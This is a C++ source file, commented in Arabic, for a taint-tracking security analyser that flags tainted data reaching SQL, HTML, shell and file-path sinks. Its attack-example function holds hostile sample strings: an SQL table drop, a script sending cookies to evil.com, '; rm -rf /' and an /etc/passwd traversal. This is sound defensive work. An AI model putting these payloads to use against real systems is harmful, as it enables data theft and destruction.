/**
 * ==========================================================
 * ملف: taint_tracker.cpp
 * الوصف: تتبع تلوث البيانات (Taint Tracking)
 * المهمة: T343 - أمان ص
 * ==========================================================
 * 
 * 📚 شرح للمبتدئين:
 * ================
 * Taint Tracking يتتبع البيانات "الملوثة" من مصادر غير موثوقة.
 * يكشف عن SQL injection, XSS, وثغرات أمنية أخرى.
 * 
 * 🔴 مصادر التلوث (Sources):
 * - إدخال المستخدم
 * - بيانات الشبكة
 * - قراءة الملفات
 * 
 * 🟢 المصارف (Sinks):
 * - استعلامات SQL
 * - عرض HTML
 * - تنفيذ أوامر النظام
 */

#include <iostream>
#include <string>
#include <vector>
#include <memory>
#include <unordered_map>
#include <unordered_set>
#include <functional>
#include <stack>
#include <algorithm>
#include <climits>

namespace sad {
namespace security {

// ==========================================================
// 📌 أنواع التلوث
// ==========================================================

/**
 * نوع مصدر التلوث
 */
enum class نوع_المصدر {
    إدخال_مستخدم,      // User input
    شبكة,              // Network data
    ملف,               // File data
    قاعدة_بيانات,      // Database
    بيئة,              // Environment variables
    غير_معروف
};

/**
 * نوع المصرف (Sink)
 */
enum class نوع_المصرف {
    استعلام_SQL,       // SQL query
    HTML,              // HTML output
    أمر_نظام,          // System command
    مسار_ملف,          // File path
    تحويل_URL,         // URL redirect
    تسلسل,             // Serialization
    eval               // Code evaluation
};

/**
 * مستوى الخطورة
 */
enum class خطورة {
    حرجة,
    عالية,
    متوسطة,
    منخفضة,
    معلومات
};

// ==========================================================
// 📌 علامة التلوث
// ==========================================================

/**
 * علامة تلوث واحدة
 */
struct علامة_تلوث {
    نوع_المصدر مصدر;
    std::string وصف;
    std::string موقع_المصدر;    // ملف:سطر
    int معرّف = 0;
};

/**
 * حالة التلوث لقيمة
 */
class حالة_التلوث {
private:
    std::vector<علامة_تلوث> علامات_;
    bool ملوث_ = false;
    bool منقّى_ = false;
    std::string طريقة_التنقية_;
    
public:
    حالة_التلوث() = default;
    
    /**
     * إضافة علامة تلوث
     */
    void لوّث(const علامة_تلوث& علامة) {
        علامات_.push_back(علامة);
        ملوث_ = true;
    }
    
    /**
     * تنقية من تلوث معين
     */
    void نقِّ(نوع_المصدر نوع, const std::string& طريقة) {
        علامات_.erase(
            std::remove_if(علامات_.begin(), علامات_.end(),
                          [نوع](const علامة_تلوث& ع) { return ع.مصدر == نوع; }),
            علامات_.end()
        );
        
        if (علامات_.empty()) {
            منقّى_ = true;
            طريقة_التنقية_ = طريقة;
        }
    }
    
    /**
     * تنقية كاملة
     */
    void نقِّ_الكل(const std::string& طريقة) {
        علامات_.clear();
        ملوث_ = false;
        منقّى_ = true;
        طريقة_التنقية_ = طريقة;
    }
    
    bool ملوث() const { return ملوث_ && !علامات_.empty(); }
    bool منقّى() const { return منقّى_; }
    const std::vector<علامة_تلوث>& العلامات() const { return علامات_; }
    const std::string& طريقة_التنقية() const { return طريقة_التنقية_; }
    
    /**
     * دمج حالتين (للعمليات الثنائية)
     */
    void ادمج(const حالة_التلوث& أخرى) {
        for (const auto& علامة : أخرى.علامات_) {
            علامات_.push_back(علامة);
        }
        if (!أخرى.علامات_.empty()) {
            ملوث_ = true;
        }
    }
};

// ==========================================================
// 📌 تحذير أمني
// ==========================================================

/**
 * تحذير أمني
 */
struct تحذير_أمني {
    خطورة مستوى;
    نوع_المصرف نوع;
    std::string رسالة;
    std::string ملف;
    int سطر;
    int عمود;
    std::vector<علامة_تلوث> علامات;
    std::string اقتراح_الإصلاح;
    std::string مثال_الهجوم;
    
    std::string النوع_كنص() const {
        switch (نوع) {
            case نوع_المصرف::استعلام_SQL: return "SQL Injection";
            case نوع_المصرف::HTML: return "XSS";
            case نوع_المصرف::أمر_نظام: return "Command Injection";
            case نوع_المصرف::مسار_ملف: return "Path Traversal";
            case نوع_المصرف::تحويل_URL: return "Open Redirect";
            default: return "Security Issue";
        }
    }
};

// ==========================================================
// 📌 قواعد التنقية
// ==========================================================

/**
 * قاعدة تنقية
 */
struct قاعدة_تنقية {
    std::string اسم_الدالة;
    نوع_المصرف للمصرف;
    std::string وصف;
};

/**
 * قواعد التنقية المعروفة
 */
class قواعد_التنقية {
private:
    std::vector<قاعدة_تنقية> قواعد_;
    
public:
    قواعد_التنقية() {
        // SQL
        قواعد_.push_back({"استعلام_آمن", نوع_المصرف::استعلام_SQL, "Parameterized query"});
        قواعد_.push_back({"هروب_SQL", نوع_المصرف::استعلام_SQL, "SQL escape"});
        
        // XSS
        قواعد_.push_back({"هروب_HTML", نوع_المصرف::HTML, "HTML escape"});
        قواعد_.push_back({"تنقية_HTML", نوع_المصرف::HTML, "HTML sanitize"});
        
        // Command
        قواعد_.push_back({"هروب_shell", نوع_المصرف::أمر_نظام, "Shell escape"});
        
        // Path
        قواعد_.push_back({"تطبيع_مسار", نوع_المصرف::مسار_ملف, "Path normalization"});
        قواعد_.push_back({"تحقق_مسار", نوع_المصرف::مسار_ملف, "Path validation"});
    }
    
    bool ينقّي(const std::string& دالة, نوع_المصرف مصرف) const {
        for (const auto& قاعدة : قواعد_) {
            if (قاعدة.اسم_الدالة == دالة && قاعدة.للمصرف == مصرف) {
                return true;
            }
        }
        return false;
    }
};

// ==========================================================
// 📌 متتبع التلوث
// ==========================================================

/**
 * متتبع تلوث البيانات
 */
class متتبع_التلوث {
private:
    // حالة التلوث لكل متغير
    std::unordered_map<std::string, حالة_التلوث> حالات_;
    
    // مصادر التلوث المعروفة
    std::unordered_set<std::string> دوال_المصادر_;
    
    // المصارف المعروفة
    std::unordered_set<std::string> دوال_المصارف_;
    
    // قواعد التنقية
    قواعد_التنقية تنقية_;
    
    // التحذيرات المكتشفة
    std::vector<تحذير_أمني> تحذيرات_;
    
    // معرّف التلوث
    int معرّف_تالي_ = 1;
    
public:
    متتبع_التلوث() {
        تهيئة_المصادر();
        تهيئة_المصارف();
    }
    
    /**
     * وضع علامة تلوث على متغير
     */
    void لوّث(const std::string& متغير, 
              نوع_المصدر مصدر,
              const std::string& موقع = "") {
        علامة_تلوث علامة;
        علامة.مصدر = مصدر;
        علامة.معرّف = معرّف_تالي_++;
        علامة.موقع_المصدر = موقع;
        علامة.وصف = وصف_المصدر(مصدر);
        
        حالات_[متغير].لوّث(علامة);
    }
    
    /**
     * نقل التلوث من متغير لآخر
     */
    void انقل(const std::string& من, const std::string& إلى) {
        auto it = حالات_.find(من);
        if (it != حالات_.end() && it->second.ملوث()) {
            حالات_[إلى].ادمج(it->second);
        }
    }
    
    /**
     * تنقية متغير
     */
    void نقِّ(const std::string& متغير, 
              const std::string& طريقة,
              نوع_المصرف للمصرف) {
        auto it = حالات_.find(متغير);
        if (it != حالات_.end()) {
            // التحقق من أن التنقية مناسبة للمصرف
            if (تنقية_.ينقّي(طريقة, للمصرف)) {
                it->second.نقِّ_الكل(طريقة);
            }
        }
    }
    
    /**
     * التحقق من مصرف
     */
    تحذير_أمني* تحقق_من_مصرف(const std::string& متغير,
                              نوع_المصرف نوع,
                              const std::string& ملف,
                              int سطر) {
        auto it = حالات_.find(متغير);
        if (it == حالات_.end() || !it->second.ملوث()) {
            return nullptr;
        }
        
        // بناء التحذير
        تحذير_أمني تحذير;
        تحذير.مستوى = خطورة_المصرف(نوع);
        تحذير.نوع = نوع;
        تحذير.ملف = ملف;
        تحذير.سطر = سطر;
        تحذير.علامات = it->second.العلامات();
        تحذير.رسالة = رسالة_التحذير(نوع, it->second);
        تحذير.اقتراح_الإصلاح = اقتراح_الإصلاح(نوع);
        تحذير.مثال_الهجوم = مثال_هجوم(نوع);
        
        تحذيرات_.push_back(تحذير);
        return &تحذيرات_.back();
    }
    
    /**
     * التحقق من استدعاء دالة
     */
    void تحقق_من_استدعاء(const std::string& دالة,
                          const std::vector<std::string>& معاملات,
                          const std::string& ملف,
                          int سطر) {
        // هل هي دالة مصدر؟
        if (دوال_المصادر_.count(دالة)) {
            // المعامل الأول (عادة) هو الهدف
            // لوّث(target, ...)
        }
        
        // هل هي دالة مصرف؟
        auto it = دوال_المصارف_.find(دالة);
        if (it != دوال_المصارف_.end()) {
            نوع_المصرف نوع = نوع_مصرف_الدالة(دالة);
            for (const auto& معامل : معاملات) {
                تحقق_من_مصرف(معامل, نوع, ملف, سطر);
            }
        }
    }
    
    /**
     * الحصول على التحذيرات
     */
    const std::vector<تحذير_أمني>& التحذيرات() const {
        return تحذيرات_;
    }
    
    /**
     * هل المتغير ملوث؟
     */
    bool ملوث(const std::string& متغير) const {
        auto it = حالات_.find(متغير);
        return it != حالات_.end() && it->second.ملوث();
    }
    
    /**
     * مسح الحالة
     */
    void امسح() {
        حالات_.clear();
        تحذيرات_.clear();
    }
    
private:
    void تهيئة_المصادر() {
        // دوال قراءة الإدخال
        دوال_المصادر_.insert("اقرأ");
        دوال_المصادر_.insert("اقرأ_سطر");
        دوال_المصادر_.insert("اقرأ_ملف");
        دوال_المصادر_.insert("احصل_على_معامل");
        دوال_المصادر_.insert("احصل_على_رأس");
        دوال_المصادر_.insert("احصل_على_كوكي");
        دوال_المصادر_.insert("احصل_على_بيئة");
    }
    
    void تهيئة_المصارف() {
        // SQL
        دوال_المصارف_.insert("نفّذ_SQL");
        دوال_المصارف_.insert("استعلم");
        دوال_المصارف_.insert("raw_query");
        
        // HTML
        دوال_المصارف_.insert("اكتب_HTML");
        دوال_المصارف_.insert("عرض_قالب");
        
        // أوامر النظام
        دوال_المصارف_.insert("نفّذ");
        دوال_المصارف_.insert("shell");
        دوال_المصارف_.insert("system");
        
        // ملفات
        دوال_المصارف_.insert("افتح_ملف");
        دوال_المصارف_.insert("اقرأ_ملف");
        
        // تحويل
        دوال_المصارف_.insert("حوّل_إلى");
        دوال_المصارف_.insert("redirect");
    }
    
    std::string وصف_المصدر(نوع_المصدر مصدر) {
        switch (مصدر) {
            case نوع_المصدر::إدخال_مستخدم: return "إدخال المستخدم";
            case نوع_المصدر::شبكة: return "بيانات الشبكة";
            case نوع_المصدر::ملف: return "بيانات ملف";
            case نوع_المصدر::قاعدة_بيانات: return "بيانات قاعدة البيانات";
            case نوع_المصدر::بيئة: return "متغير بيئة";
            default: return "مصدر غير معروف";
        }
    }
    
    خطورة خطورة_المصرف(نوع_المصرف نوع) {
        switch (نوع) {
            case نوع_المصرف::استعلام_SQL:
            case نوع_المصرف::أمر_نظام:
            case نوع_المصرف::eval:
                return خطورة::حرجة;
            case نوع_المصرف::HTML:
            case نوع_المصرف::مسار_ملف:
                return خطورة::عالية;
            case نوع_المصرف::تحويل_URL:
                return خطورة::متوسطة;
            default:
                return خطورة::متوسطة;
        }
    }
    
    نوع_المصرف نوع_مصرف_الدالة(const std::string& دالة) {
        if (دالة.find("SQL") != std::string::npos || 
            دالة.find("استعلم") != std::string::npos) {
            return نوع_المصرف::استعلام_SQL;
        }
        if (دالة.find("HTML") != std::string::npos) {
            return نوع_المصرف::HTML;
        }
        if (دالة.find("نفّذ") != std::string::npos ||
            دالة.find("shell") != std::string::npos) {
            return نوع_المصرف::أمر_نظام;
        }
        if (دالة.find("ملف") != std::string::npos) {
            return نوع_المصرف::مسار_ملف;
        }
        return نوع_المصرف::HTML;
    }
    
    std::string رسالة_التحذير(نوع_المصرف نوع, const حالة_التلوث& حالة) {
        std::string رسالة;
        
        switch (نوع) {
            case نوع_المصرف::استعلام_SQL:
                رسالة = "⚠️ SQL Injection: بيانات ملوثة تُستخدم في استعلام SQL";
                break;
            case نوع_المصرف::HTML:
                رسالة = "⚠️ XSS: بيانات ملوثة تُعرض في HTML";
                break;
            case نوع_المصرف::أمر_نظام:
                رسالة = "⚠️ Command Injection: بيانات ملوثة تُستخدم في أمر نظام";
                break;
            case نوع_المصرف::مسار_ملف:
                رسالة = "⚠️ Path Traversal: بيانات ملوثة تُستخدم كمسار ملف";
                break;
            default:
                رسالة = "⚠️ ثغرة أمنية محتملة";
        }
        
        return رسالة;
    }
    
    std::string اقتراح_الإصلاح(نوع_المصرف نوع) {
        switch (نوع) {
            case نوع_المصرف::استعلام_SQL:
                return "استخدم استعلامات معاملة (parameterized queries)";
            case نوع_المصرف::HTML:
                return "استخدم هروب_HTML() أو تنقية_HTML()";
            case نوع_المصرف::أمر_نظام:
                return "تجنب تنفيذ أوامر النظام، أو استخدم قائمة بيضاء";
            case نوع_المصرف::مسار_ملف:
                return "استخدم تحقق_مسار() وتطبيع_مسار()";
            default:
                return "نقِّ البيانات قبل الاستخدام";
        }
    }
    
    std::string مثال_هجوم(نوع_المصرف نوع) {
        switch (نوع) {
            case نوع_المصرف::استعلام_SQL:
                return "'; DROP TABLE users; --";
            case نوع_المصرف::HTML:
                return "<script>document.location='http://evil.com/'+document.cookie</script>";
            case نوع_المصرف::أمر_نظام:
                return "; rm -rf /";
            case نوع_المصرف::مسار_ملف:
                return "../../../etc/passwd";
            default:
                return "";
        }
    }
};

} // namespace security
} // namespace sad

// ==========================================================
// 📌 C API للتتبع
// ==========================================================

extern "C" {

using namespace sad::security;

typedef struct SadTaintTracker SadTaintTracker;

/**
 * @brief إنشاء متتبع تلوث جديد
 * @return مؤشر للمتتبع أو nullptr عند فشل التخصيص
 */
SadTaintTracker* sad_taint_tracker_create(void) {
    try {
        auto* tracker = new (std::nothrow) متتبع_التلوث();
        return reinterpret_cast<SadTaintTracker*>(tracker);
    } catch (...) {
        return nullptr;
    }
}

/**
 * @brief تحرير متتبع التلوث
 * @param tracker المؤشر للمتتبع (يمكن أن يكون nullptr بأمان)
 */
void sad_taint_tracker_destroy(SadTaintTracker* tracker) {
    if (tracker) {
        delete reinterpret_cast<متتبع_التلوث*>(tracker);
    }
}

/**
 * @brief تلويث متغير
 */
void sad_taint_tracker_taint(SadTaintTracker* tracker,
                              const char* variable,
                              int source_type,
                              const char* location) {
    if (!tracker || !variable) {
        return;  // التحقق المبكر من المدخلات
    }
    
    // التحقق من نوع المصدر الصالح (0-5)
    if (source_type < 0 || source_type > 5) {
        return;
    }
    
    // (AR) تلويث المتغير عبر المتتبع الداخلي
    // (EN) Taint the variable through internal tracker
    auto* impl = reinterpret_cast<متتبع_التلوث*>(tracker);
    std::string var_name(variable);
    std::string loc(location ? location : "");
    impl->لوّث(var_name, static_cast<نوع_المصدر>(source_type), loc);
}

/**
 * @brief التحقق من تلوث متغير
 * @return 1 إذا ملوث، 0 غير ملوث أو خطأ
 */
int sad_taint_tracker_is_tainted(SadTaintTracker* tracker, const char* variable) {
    if (!tracker || !variable) {
        return 0;
    }
    
    try {
        return reinterpret_cast<متتبع_التلوث*>(tracker)->ملوث(variable) ? 1 : 0;
    } catch (...) {
        return 0;
    }
}

/**
 * @brief عدد التحذيرات
 */
int sad_taint_tracker_warning_count(SadTaintTracker* tracker) {
    if (!tracker) {
        return 0;
    }
    
    try {
        size_t count = reinterpret_cast<متتبع_التلوث*>(tracker)->التحذيرات().size();
        // التحقق من عدم تجاوز INT_MAX
        return (count > static_cast<size_t>(INT_MAX)) ? INT_MAX : static_cast<int>(count);
    } catch (...) {
        return 0;
    }
}

} // extern "C"
